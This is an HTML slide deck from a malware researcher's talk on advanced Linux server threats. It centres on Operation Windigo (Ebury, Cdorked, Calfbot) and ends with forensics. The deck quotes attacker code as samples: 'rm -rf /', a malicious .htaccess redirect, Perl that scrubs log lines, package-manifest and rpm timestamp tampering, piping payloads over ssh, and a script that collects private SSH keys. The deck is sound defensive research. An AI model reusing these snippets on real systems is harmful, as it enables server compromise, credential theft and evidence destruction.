@@ -1,0 +1,500 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8" /><meta name="author" content="Olivier Bilodeau" /><title>Advanced Linux Server-Side Threats</title><meta content="yes" name="apple-mobile-web-app-capable" /><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style" /><meta content="width=(device-width, initial-scale=1.0, maximum-scale=1.0,)user-scalable=no" name="viewport" /><link href="reveal.js/css/reveal.min.css" rel="stylesheet" /><link rel="stylesheet" href="reveal.js/css/theme/eset.css" id="theme" /><link href="reveal.js/lib/css/zenburn.css" rel="stylesheet" /><script type="text/javascript">document.write( '<link rel="stylesheet" href="reveal.js/css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );</script></head><body><div class="reveal"><div class="slides"><section id="_advanced_linux_server_side_threats"><h2>Advanced Linux Server-Side Threats</h2><h3>How they work and what you can do about them</h3><div class="ulist"><ul><li><p>Olivier Bilodeau, ESET (<a href="http://twitter.com/obilodeau">@obilodeau</a>)</p></li></ul></div></section>
+<section id="__apropos"><h2>:~$ apropos</h2><div class="ulist"><ul><li><p>Recent evolution of server-side malware</p></li><li><p>Windigo in-depth</p></li><li><p>DevOps malware operators?</p></li><li><p>Forensic and incident response</p></li></ul></div></section>
+<section id="__whoami"><h2>:~$ whoami</h2><h3>Olivier Bilodeau</h3><div class="ulist"><ul><li><p>Malware Researcher at ESET</p></li><li><p>InfoSec Lecturer at ETS University in Montreal Canada</p></li><li><p>Previously</p><div class="ulist"><ul><li><p>FLOSS Perl developer, <a href="http://www.packetfence.org/" class="bare">http://www.packetfence.org/</a></p></li><li><p>Linux/Unix Sysadmin for a large Canadian ISP</p></li></ul></div></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>worked directly on the Operation Windigo report and reversing of the Perl
+spambot, honeypots and data analysis</p></div></aside></section>
+<section id="__w_grep_v_e_olivier"><h2>:~$ w | grep -v -e olivier</h2><h3>aka Who are you?</h3><aside class="notes"><div class="ulist"><ul><li><p>everyone up.</p></li><li><p>sit down if you never touched a linux system (android excluded)</p></li><li><p>sit down if you never administered a linux system</p></li><li><p>sit down if you never worked professionally as a linux sysadmin</p></li><li><p>sit down if you never done incidence response or forensics on a linux system</p></li><li><p>of you, any systems engineers aka dev for distros? if yes, I want to speak
+w/ you ;)</p></li></ul></div>
+<div class="paragraph"><p>Alright, enough with the silly commands&#8230;&#8203;</p></div></aside></section>
+<section id="_server_side_threats"><h2>Server-side threats</h2></section>
+<section id="_old_school_defacement"><h2>Old-school defacement</h2><div class="paragraph"><p><span class="image"><img src="images/defacement_exemple.png" alt="defacement_exemple" /></span></p></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Motivated by visibility and to show off their "skills"</p></li><li><p>Usually comes with animated gifs and background music</p></li><li><p>Some takes political position</p></li><li><p>Can find a list zone-h.org</p></li></ul></div></aside></section>
+<section id="_old_school_dammage"><h2>Old-school dammage</h2><h3>For the lulz</h3><div class="listingblock oversize"><div class="content"><pre class="highlight"><code class="bash language-bash">rm -rf /</code></pre></div></div></section>
+<section id="_server_side_threats_evolved"><h2>Server-side threats evolved</h2><div class="ulist"><ul><li><p>Motivated by money</p></li><li><p>But why crimeware on servers?</p><div class="ulist"><ul><li><p>Always up</p></li><li><p>Almost always reachable</p></li><li><p>Good bandwidth</p></li><li><p>Good IP reputation</p></li><li><p>May contain sensitive information</p></li></ul></div></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>leverages servers' properties</p></div></aside></section>
+<section id="_why_should_you_care_about_crimeware"><h2>Why should you care about Crimeware?</h2><div class="ulist"><ul><li><p>(Your) Infected servers are put on blacklists</p><div class="ulist"><ul><li><p>AV blacklists &#8594; Web visitors get warning</p></li><li><p>Spamhaus' XBL &#8594; Server can&#8217;t send e-mail</p></li><li><p>Google&#8217;s Safe Browsing API &#8594; Web visitors get warning</p></li></ul></div></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>bad for traffic and reputation</p></div></aside></section>
+<section id="_crimeware_evolution"><h2>Crimeware evolution</h2><h3>A brief look in recent history</h3></section>
+<section id="__htaccess_redirection"><h2>.htaccess redirection</h2><div class="ulist"><ul><li><p>Redirection done using <code>mod_rewrite</code> rules inside a <code>.htaccess</code> file</p></li><li><p>Infection vector usually is</p><div class="ulist"><ul><li><p>Credential stealing/bruteforce (FTP or admin panel)</p></li><li><p>Vulnerable web application</p></li></ul></div></li></ul></div></section>
+<section id="__htaccess_redirection_2"><h2>.htaccess redirection</h2><div class="listingblock"><div class="content"><pre class="highlight"><code class="apache language-apache">&lt;IfModule mod_rewrite.c&gt;
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} ^.*(google|ask|yahoo|baidu|youtube|wikipedia|qq|excite|altavista|msn|netscape|aol|hotbot|goto|infoseek|mamma|alltheweb|lycos|search|metacrawler|bing|dogpile|facebook|twitter|blog|live|myspace|mail|yandex|rambler|ya|aport|linkedin|flickr|nigma|liveinternet|vkontakte|webalta|filesearch|yell|openstat|metabot|nol9|zoneru|km|gigablast|entireweb|amfibi|dmoz|yippy|search|walhello|webcrawler|jayde|findwhat|teoma|euroseek|wisenut|about|thunderstone|ixquick|terra|lookle|metaeureka|searchspot|slider|topseven|allthesites|libero|clickey|galaxy|brainysearch|pocketflier|verygoodsearch|bellnet|freenet|fireball|flemiro|suchbot|acoon|cyber-content|devaro|fastbot|netzindex|abacho|allesklar|suchnase|schnellsuche|sharelook|sucharchiv|suchbiene|suchmaschine|web-archiv)\.(.*)
+RewriteRule ^(.*)$ http://[ link redacted ] [R=301,L]
+RewriteCond %{HTTP_REFERER} ^.*(web|websuche|witch|wolong|oekoportal|t-online|freenet|arcor|alexana|tiscali|kataweb|orange|voila|sfr|startpagina|kpnvandaag|ilse|wanadoo|telfort|hispavista|passagen|spray|eniro|telia|bluewin|sympatico|nlsearch|atsearch|klammeraffe|sharelook|suchknecht|ebay|abizdirectory|alltheuk|bhanvad|daffodil|click4choice|exalead|findelio|gasta|gimpsy|globalsearchdirectory|hotfrog|jobrapido|kingdomseek|mojeek|searchers|simplyhired|splut|the-arena|thisisouryear|ukkey|uwe|friendsreunited|jaan|qp|rtl|search-belgium|apollo7|bricabrac|findloo|kobala|limier|express|bestireland|browseireland|finditireland|iesearch|ireland-information|kompass|startsiden|confex|finnalle|gulesider|keyweb|finnfirma|kvasir|savio|sol|startsiden|allpages|america|botw|chapu|claymont|clickz|clush|ehow|findhow|icq|goo|westaustraliaonline)\.(.*)
+RewriteRule ^(.*)$ http://[ link redacted ] [R=301,L]
+&lt;/IfModule&gt;</code></pre></div></div>
+<aside class="notes"><div class="paragraph"><p>Easy to spot
+Clear-text, not packed in any way
+root not required</p></div></aside></section>
+<section id="_darkleech"><h2>Darkleech</h2><h3>aka Apmod and Chapro</h3><div class="ulist"><ul><li><p>Apache module for redirecting web traffic</p></li><li><p>Sold for <strong>$1000</strong> on underground forums</p><div class="ulist"><ul><li><p>Malware-as-a-service for Linux</p></li><li><p>Multiples operators and campaigns</p></li></ul></div></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>Sébastien Duquette blogged about one of the campaign dubbed "Home" in WLS.
+Requires root to be installed</p></div></aside></section>
+<section id="_darkleech_2"><h2>Darkleech</h2><div class="listingblock"><div class="content"><pre class="highlight"><code class="nohighlight language-nohighlight">Price: 1000$
+Installation instructions: Place mod in any folder, edit Apache config file to add 1 string and restart server.
+Major features:
+- insert frames in php, html,js on the fly
+- frame delivered to unique users only, no frame on repeat. &lt;&lt; known anti-forensics. Interesting, how this implemented here, external logs or based on Apache2?
+- possibility framing of traffic, that came from search engines only &lt;&lt; looks like again Referer field?
+- different modes of framing – low, standard, aggressive
+- update of malicious frame from external URL
+- Admins of webserver, that have ssh access to it, excluded from frame delivery. System also able to detect Admin’s IP by URL of administrative access and ban Admin IP from framing procedure.
+- When root or any user in sudo group login into server, module transfer to “quiet mode”, and only when IP of the admin banned or filtered out, server proceed with infecting visitors.
+- users filtered out by origin, OS version, local IP requests etc. &lt;&lt; this is based on User-Agent, as far as I understand.
+- When module detect any suspicious process in memory(tcpdump, rkhunter etc), it stop the activity
+- option to encryption of framing.
+As seller claim, module was used in private for 2 last years, now available for sell. Current version is 14.0
+Major reason to going public – reticently researchers came close to find it out. So there is no reason to stay private.
+Mode written in C and PHP</code></pre></div></div></section>
+<section id="_phalanx_phalanx_2"><h2>Phalanx / Phalanx 2</h2><h3>Getting to the kernel</h3><div class="ulist"><ul><li><p>Very effective and clever rootkit</p></li><li><p>Hooks kernel syscalls by injecting code inside the kernel</p></li><li><p>Not that portable. It may break with new kernel version.</p></li></ul></div></section>
+<section id="_enter_operation_windigo"><h2>Enter Operation Windigo</h2></section>
+<section id="_what_is_operation_windigo"><h2>What is Operation Windigo?</h2><div class="paragraph"><p>Crimeware operation consisting of several malware components&#8201;&#8212;&#8201;Linux/Ebury,
+Linux/Cdorked and Perl/Calfbot&#8201;&#8212;&#8201;where the <strong>infrastructure is mostly operated
+on compromised servers</strong>.</p></div>
+<div class="paragraph"><p>Used for <strong>traffic redirection</strong> and sending <strong>spam</strong>.</p></div>
+<aside class="notes"><div class="ulist"><ul><li><p>a set of malware</p></li><li><p>use compromised server for infrastructure</p></li></ul></div></aside></section>
+<section id="_operation_windigo"><h2>Operation Windigo</h2><h3>a joint investigation effort</h3><div class="paragraph"><p><span class="image"><img src="images/cert-bund.png" alt="cert-bund" /></span> <span class="image"><img src="images/cern.png" alt="cern" /></span> <span class="image"><img src="images/eset.png" alt="eset" /></span> <span class="image"><img src="images/snic.png" alt="snic" /></span></p></div>
+<aside class="notes"><div class="ulist"><ul><li><p>The Ebury Working Group</p></li><li><p>CERT-Bund: Germany</p></li><li><p>CERN, hedron collider, you know these guys, [mostly Genève]</p></li><li><p>SNIC: Swedish National Infrastructure for Computing</p></li><li><p>and law enforcement</p></li></ul></div></aside></section>
+<section id="_linux_ebury"><h2>Linux/Ebury</h2><div class="ulist"><ul><li><p>OpenSSH backdoor</p><div class="ulist"><ul><li><p>Before: replacing original OpenSSH binaries (ssh, sshd, ssh-add)</p></li><li><p>Then: replaces libkeyutils.so library and hooks OpenSSH address space</p></li><li><p>Now: patch libkeyutils.so library to load libns2.so and hooks OpenSSH address space</p></li></ul></div></li><li><p>Provides a backdoor root shell to the operators</p><div class="ulist"><ul><li><p>Doesn’t leave traces behind when used</p></li></ul></div></li><li><p>Steals SSH passwords and keys</p><div class="ulist"><ul><li><p>When connecting <strong>to</strong> and <strong>from</strong> the infected machine</p></li></ul></div></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Named Ebury by Steinar H. Gunderson in Nov 2011</p></li><li><p>Core of the Windigo Operation</p></li><li><p>Then in 2013, libkeyutils.so</p></li></ul></div></aside></section>
+<section id="_how_the_shared_library_works"><h2>How the shared library works</h2><div class="olist arabic"><ol class="arabic"><li><p>Shared library has a <strong>constructor function</strong> executed when loaded</p></li><li><p>Detect main executable that is loading <code>libkeyutils.so</code></p></li><li><p>Hook imported function such as <code>crypt</code> and <code>syslog</code></p></li><li><p>Detect main executable address space (<code>dlopen(NULL)</code>)</p></li><li><p>Patch code inside main executable to redirect function calls to the malicious <code>libkeyutils.so</code></p></li></ol></div></section>
+<section id="_how_the_shared_library_works_cont"><h2>How the shared library works (cont.)</h2><div class="paragraph"><p><span class="image"><img src="images/ebury_code_hook.png" alt="ebury_code_hook" /></span></p></div></section>
+<section id="_key_parse_clean"><h2>key_parse clean</h2><div class="paragraph"><p><span class="image"><img src="images/ssh_key_parse_clean.png" alt="ssh_key_parse_clean" /></span></p></div></section>
+<section id="_key_parse_hooked"><h2>key_parse hooked</h2><div class="paragraph"><p><span class="image"><img src="images/ssh_key_parse_hooked.png" alt="ssh_key_parse_hooked" /></span></p></div></section>
+<section id="_how_information_is_exfiltrated"><h2>How information is exfiltrated?</h2><div class="olist arabic"><ol class="arabic"><li><p>Passwords are sent inside a DNS packet with all required information such as username, target IP address and port</p></li><li><p>Keys are kept in memory and are later fetched by the operators with the <code>Xcat</code> command</p></li></ol></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code>98.174.121.19 -&gt; 75.82.52.14  DNS Standard query 0x4cdd  A b74bebe10cad6ffe684bf8a1.62.220.51.41</code></pre></div></div></section>
+<section id="_backdoor_interaction"><h2>Backdoor interaction</h2><div class="paragraph"><p>To trigger the Linux/Ebury remotely in sshd, a special SSH client version identifier is used</p></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code>192.27.81.11 -&gt; 78.240.11.44 SSH Server: Protocol (SSH-2.0-OpenSSH_5.3)
+78.240.11.44 -&gt; 192.27.81.11 SSH Client: Protocol (SSH-2.0-0861d60b2465c0383076d8233273da)
+
+[11 bytes password][optional 4 bytes command][optional 4 bytes argument]</code></pre></div></div></section>
+<section id="_backdoor_interaction_cont"><h2>Backdoor interaction (cont.)</h2><div class="paragraph"><p>5 commands</p></div>
+<div class="ulist"><ul><li><p>Xver: print Linux/Ebury version installed</p></li><li><p>Xcat: print stolen credentials</p></li><li><p>Xbnd: choose binded IP address for SSH tunnel</p></li><li><p>Xpsw: set additional 4 byte xor key for future backdoor usage</p></li><li><p>None: get a shell</p></li></ul></div></section>
+<section id="_linux_cdorked"><h2>Linux/Cdorked</h2><div class="ulist"><ul><li><p>httpd/nginx/lighttpd backdoor</p><div class="ulist"><ul><li><p>Replacing binary on the server</p></li></ul></div></li><li><p>Redirect HTTP request on legitimate web site the exploit packs or affiliate links</p></li><li><p>Use shared memory (POSIX IPC) for state and configuration</p><div class="ulist"><ul><li><p>No file on disk</p></li><li><p>It&#8217;s encrypted with a static XOR key unique per infection</p></li></ul></div></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Installed on a small subset of Ebury infected server</p></li><li><p>Replace binary on server</p></li><li><p>Lots of effort put into making the patch cross-server</p></li><li><p>A lot of porn website compromised</p></li></ul></div></aside></section>
+<section id="_linux_cdorked_stealth"><h2>Linux/Cdorked Stealth</h2><div class="paragraph"><p><span class="image"><img src="images/cdorked_redirect_conditions.png" alt="cdorked_redirect_conditions" width="35%" /></span></p></div></section>
+<section id="_linux_cdorked_stealth_cont"><h2>Linux/Cdorked Stealth (cont.)</h2><div class="ulist"><ul><li><p>Presence and content of Accept, Accept-Language, Referer, User-Agent headers</p></li><li><p>Presence of administrative panel references in URL</p><div class="ulist"><ul><li><p>*cpanel*</p></li><li><p>*secur*</p></li><li><p>*bill*</p></li><li><p>etc</p></li></ul></div></li><li><p>It is a web page? (.html, .php, etc)</p></li><li><p>Did I redirect this client IP address in the last 24 hours?</p></li></ul></div></section>
+<section id="_linking_cdorked_and_ebury"><h2>Linking Cdorked and Ebury</h2><div class="paragraph"><p><span class="image"><img src="images/cdorked_crypto.png" alt="cdorked_crypto" /></span> <span class="image"><img src="images/ebury_crypto.png" alt="ebury_crypto" /></span></p></div>
+<div class="paragraph"><p>Cdorked | Ebury</p></div></section>
+<section id="_from_there"><h2>From there</h2><div class="ulist"><ul><li><p>Reversed the domain generation algorithm (DGA)</p></li><li><p>Had access to exfiltration server</p><div class="ulist"><ul><li><p>Witnessed 7000 infected servers</p></li></ul></div></li><li><p>Access to compromised systems through notifications</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Exfil server was operated by a known contact. Then we realized it was big.</p></li><li><p>Cleaning then noticing reinfections, seeing the spread we realized that this
+was all about stolen credentials</p></li></ul></div></aside></section>
+<section id="_perl_calfbot"><h2>Perl/Calfbot</h2><div class="ulist"><ul><li><p>Perl spamming daemon</p></li><li><p>Deletes itself when running, resides only in memory</p></li><li><p>Hides as <code>crond</code></p></li></ul></div></section>
+<section id="_posix_calfbot"><h2>POSIX/Calfbot</h2><div class="paragraph"><p><span class="image"><img src="images/os_distribution.png" alt="os_distribution" width="80%" /></span></p></div>
+<aside class="notes"><div class="ulist"><ul><li><p>obtained via eavesdropping of the C&amp;C SSL traffic</p></li></ul></div></aside></section>
+<section id="_the_operation"><h2>The "Operation"</h2><div class="paragraph"><p>Beyond individual malware components, how is this thing operated.</p></div></section>
+<section id="_big_picture"><h2>Big Picture</h2><div class="paragraph"><p><span class="image"><img src="images/windigo_big_picture.png" alt="windigo_big_picture" width="87%" /></span></p></div>
+<aside class="notes"><div class="ulist"><ul><li><p>I know its small</p></li><li><p>operators at the bottom, victims on top</p></li><li><p>layers of compromised servers separates them</p></li><li><p>proxy servers, DNAT, DNS servers, Web servers, C&amp;C all run on Ebury infected
+machines</p></li></ul></div></aside></section>
+<section id="_how_does_it_expand"><h2>How does it expand?</h2><div class="paragraph"><p><span class="image"><img src="images/infection_scenario.png" alt="infection_scenario" width="88%" /></span></p></div>
+<aside class="notes"><div class="ulist"><ul><li><p>See, it&#8217;s all about stolen credentials</p></li><li><p>SSH gateways are especially bad</p></li><li><p>mention cPanel support server compromise</p></li><li><p>Stop using passwords, consider Two-Factor Auth</p></li></ul></div></aside></section>
+<section id="_how_can_it_do_so"><h2>How can it do so?</h2><div class="paragraph"><p><span class="image"><img src="images/leaked_password_root_vs_nonroot.png" alt="leaked_password_root_vs_nonroot" width="80%" /></span></p></div></section>
+<section id="_money_trail"><h2>Money trail</h2><div class="ulist"><ul><li><p>Install malware on Windows end-users</p><div class="ulist"><ul><li><p>Exploit Kit: Flashpack, Blackhole, RIG, Nuclear Pack</p></li><li><p>Win32/Glupteba (more spam capability)</p></li></ul></div></li><li><p>Spam</p><div class="ulist"><ul><li><p>Mostly adult affiliate programs links</p></li><li><p>Some Casino</p></li></ul></div></li><li><p>Web-site redirections to adult affiliate programs</p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>before was Win32/Boaxxe (click fraud) dep on country</p></div></aside></section>
+<section id="_impact"><h2>Impact</h2><div class="ulist"><ul><li><p><strong>25 000+</strong> compromised servers</p></li><li><p><strong>500 000</strong> browser redirections per day (20% go to exploit packs)</p></li><li><p><strong>35M+</strong> spam sent per day</p></li><li><p><strong>kernel.org infected</strong> at some point in 2011</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>There is an ongoing law enforcement investigation</p></li></ul></div></aside></section>
+<section id="_why_advanced" data-background="#797620"><h2>Why advanced?</h2><div class="ulist"><ul><li><p>Stealth</p><div class="ulist"><ul><li><p>close to no disk persistence</p></li><li><p>uses shared memory</p></li><li><p>hooks into binaries</p></li><li><p>do not affect existing services</p></li></ul></div></li><li><p>Effective</p><div class="ulist"><ul><li><p>large number of compromised servers</p></li><li><p>validates spamming</p></li><li><p>maximizes available server resources</p></li></ul></div></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>libkeyutils, is a real system library so this is nasty</p></li><li><p>looking for hashes of daemons not enough (libkeyutils, a real library)</p></li></ul></div></aside></section>
+<section id="_automation"><h2>Automation</h2></section>
+<section id="_devops_malware_operators"><h2>DevOps malware operators?</h2><div class="ulist"><ul><li><p>Found very interesting monitoring and deployments scripts</p></li><li><p>Interesting usage (SSH stream redirections):</p><div class="listingblock"><div class="content"><pre class="highlight"><code class="bash language-bash">cat payload.pl | ssh victim perl
+# or
+cat payload.sh | ssh victim bash</code></pre></div></div></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Leaves little traces since</p><div class="ulist"><ul><li><p>stdin is from operator</p></li><li><p>stdout/stderr goes to him</p></li></ul></div></li><li><p>Without clever monitoring, nothing (log) will stay on disk</p></li><li><p>Explains why we saw nothing in auditd</p></li></ul></div></aside></section>
+<section id="_recon_deployment_scripts"><h2>Recon / Deployment scripts</h2><div class="ulist"><ul><li><p>Written in Perl</p></li><li><p>Always reports to <code>STDOUT</code></p><div class="ulist"><ul><li><p>Errors</p></li><li><p>Status</p></li></ul></div></li></ul></div></section>
+<section id="_perl_scripts"><h2>Perl scripts</h2><div class="ulist"><ul><li><p>Not obfuscated</p></li><li><p>But as readable as Perl can be</p></li></ul></div>
+<div class="paragraph"><p><span class="image"><img src="images/perl.jpg" alt="perl" width="120%" /></span></p></div></section>
+<section id="_eliminates_evidence"><h2>Eliminates evidence</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>`mkdir -p /home/tmpq`; $tfile = '/home/tmpq/q3def';
+@blist=`find  /var/log -type f -mtime -1 -size +100M -ls`; print @blist if @blist;
+@logs=`cat /etc/syslog.conf|grep -vi \"#\"|grep -vi dev`;
+foreach (@logs) {$logs{$1}++ if m|.*?(/.+)| and not m|/mail| }
+foreach $file (keys %logs) {
+    next if checktime($file); # print "Check $file\n";
+    $system="cat $file|egrep -i \"$n_date\"|egrep -i \"$string\""; #print "$system\n";
+    $test=`$system`; print "Found in $file. Try to correct\n" if $test; next unless $test;
+    $system="cat $file|egrep -vi \"$n_date\"&gt;$tfile;cat $file|egrep \"$n_date\"|egrep -vi \"$string\"\&gt;&gt;$tfile;cat $tfile&gt;$file;rm -f $tfile";
+#    print "$system\n"; #!
+    system($system) }</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Parses syslog.conf to eliminate ANY logline that has:</p><div class="ulist"><ul><li><p>username</p></li><li><p>'Failed password'</p></li><li><p>IP</p></li></ul></div></li><li><p>Avoids large files &gt;100Mb</p></li><li><p>Moves on to any file in /var/log/ except a blacklist</p></li></ul></div></aside></section>
+<section id="_recon_scripts"><h2>Recon scripts</h2><div class="ulist"><ul><li><p>Checks for LD_PRELOAD trickery</p></li><li><p>Various restrictive <code>ssh</code> configurations</p></li><li><p>BSD jails</p></li></ul></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code class="perl language-perl">if (-l '/bin') {
+    print "\n\tlALERT!!! /bin is link, seems like bsd jail\n";
+    $alert++
+}</code></pre></div></div>
+<div class="ulist"><ul><li><p>CPanel, BRadmin, Nagios ipcs plugin, auditd</p></li></ul></div></section>
+<section id="_recon_cont"><h2>Recon (cont)</h2><div class="ulist"><ul><li><p>Generic <code>ssh</code> honeypots</p></li></ul></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code>@sd = `strings /usr/sbin/sshd |grep -e "^/usr/local/libexec"`;
+chomp @sd;
+if (@sd) { print "\n\tALERT!!! , ".join("|",@sd)."\n" }
+my $ppid=getppid;
+my $pb=readlink("/proc/$ppid/exe");
+if ($pb ne '/usr/sbin/sshd') {
+    print "\n\tlALERT!!! parent:$pb, $ppid\n";
+    $alert++
+}</code></pre></div></div></section>
+<section id="_recon_cont_2"><h2>Recon (cont)</h2><div class="ulist"><ul><li><p>Detects available tools (pkg mgmt, gcc, patch, &#8230;&#8203;)</p></li><li><p>Check for header files to compile OpenSSH</p></li><li><p>Check if Ebury is already installed</p></li></ul></div></section>
+<section id="_deployment_script"><h2>Deployment script</h2><div class="ulist"><ul><li><p>Uses Perl&#8217;s <em>DATA</em> to pass files through <code>ssh</code></p></li></ul></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code>open(TAR,"| tar zxf - $ln $sl");
+binmode(DATA);
+while(&lt;DATA&gt;) {
+    print TAR $_;
+}
+close TAR;
+
+__DATA__
+^_&lt;8b&gt;^H^@VÃÇS^@^Cí½    X^TÇÖ0Ü3Ì("0hÀ¨^Q^]^U#î&lt;8e&gt;&lt;82&gt;+( è h^@^E&lt;
+8c&gt;¸¯&lt;88&gt;^K^Fg^T^W^PÒ`hÚ6ÞKÌÍ¢Ù4Ñ71jbôÆ^]\@&lt;8c&gt;^Z%Æ%j$Æhã&lt;98&gt;&lt;88&gt;&lt;
+9a&gt;¸kÿç&lt;9c&gt;ê&lt;86&gt;&lt;81&gt;ÈûÝÿû&lt;9e&gt;÷{&lt;9e&gt;ÿùimªêÔ©Sû©sªjúÌ&lt;9e&gt;9yñâ^^&lt;96&gt;i
+&lt;93&gt;¹ÿ¹§;&lt;½^B^BÈ&lt;85&gt;§&lt;86&gt;Û»gïÀî&lt;9c&gt;¥GÏ^&lt;96&gt;Þ^AÝ^CÁßÝbéÙ£^Ggîþ?X¦ÊÇ
+&gt;ß6)ÕlæRSRlÿ^]Þÿ*þÿ£Ï²&lt;88&gt;¨Áz&lt;9d&gt;®2ìÂ^Mà0Ô½1^K&lt;87&gt;¨pÿ×ªÒ&lt;84&gt;p}¸zð÷</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>Special literal that allows to embed binary data in a Perl script</p></li><li><p>avoids having them to fetch additional stuff (less visible)</p></li><li><p>the DATA is real binary, not the vim shit I pasted here</p></li></ul></div></aside></section>
+<section id="_deployment_script_cont"><h2>Deployment script (cont)</h2><div class="paragraph"><p>Altering package management manifests</p></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code>sub fix_md5 {
+    my @df = glob("/var/lib/dpkg/info/libkeyutils1*.md5sums");
+    get_md5();
+    open( $fh, "&lt;$df" );
+    my @q = &lt;$fh&gt;;
+    close $fh;
+    for (@q) {
+        $c++ if s|\S+  $d1/$rfile\n|$md5  $d1/$rfile\n|
+    }
+
+    open( $fh, "&gt;$df" );
+    print $fh @q;
+    close $fh;
+    print "md5fix: fixed lines: $c\n";
+}</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>this is the debian version</p></li><li><p>I cleaned it up a bit so it&#8217;ll fit the screen</p></li></ul></div></aside></section>
+<section id="_deployment_script_cont_2"><h2>Deployment script (cont)</h2><h3>How do you install an rpm in the past?</h3><div class="listingblock"><div class="content"><pre class="highlight"><code class="perl language-perl">$install_time = `rpm -q --qf '%{INSTALLTIME}\n' keyutils-libs`
+`MYRPMT="$install_time" LD_PRELOAD=./${override_time.so}
+rpm --replacepkgs --replacefiles --noscripts --nosignature -U malicious_libkeyutils_package.rpm`</code></pre></div></div>
+<aside class="notes"><div class="ulist"><ul><li><p>This is a de-obfuscated version</p></li><li><p>The original install date is kept in a variable pushed in the environment.
+override_time.so replaces time implementation to return MYRPMT when it will
+be called by rpm</p></li></ul></div></aside></section>
+<section id="_deployment_script_cont_3"><h2>Deployment script (cont)</h2><div class="listingblock"><div class="content"><pre class="highlight"><code class="bash language-bash"># rpm --verify keyutils-libs
+(no error)
+# rpm -qi keyutils-libs
+Name        : keyutils-libs                Relocations: (not relocatable)
+Version     : 1.4                               Vendor: CentOS
+Release     : 4.el6                         Build Date: Fri 22 Jun 2012 02:20:38 AM EDT
+Install Date: Mon 27 Jan 2014 06:08:43 AM EST      Build Host: c6b10.bsys.dev.centos.org
+Group       : System Environment/Base       Source RPM: keyutils-1.4-4.el6.src.rpm
+Size        : 59320                            License: GPLv2+ and LGPLv2+
+Signature   : RSA/SHA1, Sun 24 Jun 2012 06:18:51 PM EDT, Key ID 21efc4bf71fbfe7b
+URL         : http://people.redhat.com/~dhowells/keyutils/
+Summary     : Key utilities library
+Description :
+This package provides a wrapper library for the key management facility system
+calls.</code></pre></div></div></section>
+<section id="_daily_monitoring_script"><h2>Daily monitoring script</h2><div class="ulist"><ul><li><p>Bash</p></li><li><p>Grabs keys, known hosts, user ssh configs</p></li></ul></div>
+<div class="listingblock"><div class="content"><pre class="highlight"><code>echo __% Passwd
+cat /etc/passwd
+# [...]
+ud=`awk -F':' '{print $6}' &lt;/etc/passwd|sort -u`;
+echo __% KHosts
+for f in $ud;do cat $f/.ssh/known_hosts 2&gt;/dev/null;done
+echo __% SSHConf
+for f in $ud;do cat $f/.ssh/config 2&gt;/dev/null &amp;&amp; echo _%__${f};done
+echo __% SSHKeys_priv
+for f in $ud;do
+[ -e $f/.ssh/id_rsa ] &amp;&amp; { echo _%__$f/.ssh/id_rsa;cat $f/.ssh/id_rsa;echo; }
+[ -e $f/.ssh/id_dsa ] &amp;&amp; { echo _%__$f/.ssh/id_dsa;cat $f/.ssh/id_dsa;echo; } done</code></pre></div></div></section>
+<section id="_other_scripts_findings"><h2>Other scripts findings</h2><div class="ulist"><ul><li><p>Modifies SELinux policy</p></li><li><p>Various styles of installation</p><div class="ulist"><ul><li><p>precompiled libraries</p></li><li><p>on-site compilation</p></li><li><p>packages</p></li></ul></div></li><li><p>Looks for over 40 backdoors/rootkits</p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>some are not even publicly documented</p></div></aside></section>
+<section id="_devops_malware_operators_2" data-background="#797620"><h2>DevOps malware operators</h2><div class="ulist"><ul><li><p>Manage <em>their</em> infrastructure with code</p></li><li><p>Pass data in-band with <code>ssh</code></p></li><li><p>Eliminate logs, restore timestamps</p></li><li><p>Get rid of security features</p></li></ul></div>
+<aside class="notes"><div class="ulist"><ul><li><p>devops-style but with bad Perl code ;)</p></li><li><p>ssh means encrypted, which is impossible to decrypt</p></li><li><p>extensive pipe and filter tricks, with LD_PRELOAD trickery</p></li><li><p>packaging manifests, other malware, SELinux, &#8230;&#8203;</p></li></ul></div></aside></section>
+<section id="_forensics_and_incident_response"><h2>Forensics and incident response</h2></section>
+<section id="_forensics"><h2>Forensics</h2><div class="ulist"><ul><li><p>Evidence gathering</p></li><li><p>Process analysis</p></li><li><p>Network analysis</p></li></ul></div></section>
+<section id="_caution" data-background="#125F79"><h2>Caution</h2><div class="ulist step"><ul><li class="fragment"><p>Running at same privilege level</p></li><li class="fragment"><p>It&#8217;s an arm&#8217;s race</p></li><li class="fragment"><p>Aim for out-of-band (network or memory acquisition)</p></li></ul></div>
+<aside class="notes"><div class="paragraph"><p>right now most of the stuff covered in this section works but there&#8217;s no
+guarante they won&#8217;t hook it, LD_PRELOAD it or whatever. They run as root</p></div></aside></section>
+<section id="_evidence_gathering"><h2>Evidence gathering</h2><div class="paragraph"><p>How to spy on a malicious user with the same privileges?</p></div>
